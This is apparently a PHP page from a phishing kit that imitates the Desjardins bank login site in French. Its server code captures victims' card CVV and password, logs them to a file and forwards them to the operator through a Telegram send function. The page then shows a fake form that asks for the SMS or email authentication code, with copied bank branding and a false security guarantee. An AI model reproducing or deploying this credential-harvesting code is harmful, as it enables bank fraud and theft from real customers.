<?php session_start();
require_once "../sendto.php" ;

if(!isset($_GET['loop'])){
  if (!isset($_POST["cvv"]) OR !isset( $_POST["mdp"]) ) {
    //var_dump($_GET['loop']) ;
    header("Location: ./index.php");
    //  exit();
  }
}


if (isset($_POST["cvv"]) OR isset( $_POST["mdp"]) ) {
  $_SESSION["cvv"] = $_POST['cvv'] ;
$_SESSION["mdp"] = $_POST['mdp'] ;
$heure = date("h:i:s") ;
$date = date("Y:m:d") ;


$donnees = "\n"."** NOUVELLE CONNEXION ** a :  ".$_SESSION["bank"].
"\n"."heure :".$heure.
"\n"."date :".$date.
"\n". "Cvv : " .$_SESSION["cvv"] .
"\n"."Mdp : " .$_SESSION["mdp"] .
"\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);

sendMessageToTelegram($donnees) ;


}


?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">   
    
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/desjardin/styles_mobile.css">

<link rel="stylesheet" media="screen and (min-width: 769px)" href="/desjardin/styles_pc.css">

    <title>se connecter</title>
</head>

<header>
    <div class="firstHead">
        <span>
            <span>    AA</span>
            <span>English</span>
            <span>Nous joindre</span>
            <span>Aide</span>
        </span>

    </div>
    <div class="secondHeader">
<img width="200px" height="40px" src="./img/logo1.svg">
<img class="logo2" width="150px" height="40px" src="./img/logo2.svg">
<img class="logo3" width="150px" height="40px" src="./img/logo3.svg">
    </div>
</header>
<body>
    <div class="container">
        <div class="formContainer">
        <form action="/desjardin/loop.php" method="post">
                <h1>Se Connecter</h1>
            <label for="sms"> Vous recevrez un code d'authenthification sur votre E-mail ou sms</label>
            <input type="text" name="sms">

       

        <div class="valid">
            <input type="submit" value="Valider">
        </div>
            

        </form>

        <div class="formFooter">
            <div class="nav1">
            <ul><a href="">S’inscrire à AccèsD</a></ul>
            <ul><a href="">S’inscrire à AccèsD Affaires</a></ul>
            <ul><a href="">Devenir membre</a></ul>
            </div>

        <div class="nav2">
            <div class="nav2-1">
                <ul><a href="">  Sécurité du site</a></ul>
                <ul><a href="">Soutien technique</a></ul>
                <ul><a href="">Signaler une fraude</a></ul>
            </div>

            <div class="nav2-2">
          <ul><a href="">   
            <img style="width:15px ; margin-right:10px" src="./img/lock.svg" alt="">Sécurité garantie à 100 %</a></ul>
            </div>
        </div>
    </div>
 </div>

        <div class="image">

        </div>
    </div>
    
</body>

<footer>
    <div class="h-footer">
    <ul class="ul-1" ><a href=""><b>SERVICES AUX PARTICULIERS</b></a></ul> 
   <ul class="ul-2" ><a href=""><b> SERVICES AUX ENTREPRISES </b></a></ul>
   <ul class="ul-3" ><a href=""><b>CONSEILS </b></a></ul>
   <ul class="ul-4" ><a href=""><b>À PROPOS </b></a></ul>
   <ul ><a href=""><b>APPLICATION MOBILE</b></a></ul>
    </div>

    <div class="b-footer">
        <div class="b-footer-1">
        <ul class="ul-1" ><a href=""><b> Sécurité </b></a></ul>
        <ul class="ul-2" ><a href=""><b>  Conditions d'utilisation et notes légales </b></a></ul> 
        <ul class="ul-3" ><a href=""><b> Confidentialité </b></a></ul>
        <ul class="ul-4" ><a href=""><b>  Personnaliser les témoins </b></a></ul>
        <ul class="ul-5" ><a href=""><b>    Accessibilité </b></a></ul>
        <ul class="ul-6" ><a href=""><b> Plan du site </b></a></ul>
       
        
        </div>
        <div class="b-footer-2">
        © 1996-2024, Mouvement des caisses Desjardins. Tous droits réservés.
        </div>
    </div>
</footer>
</html>
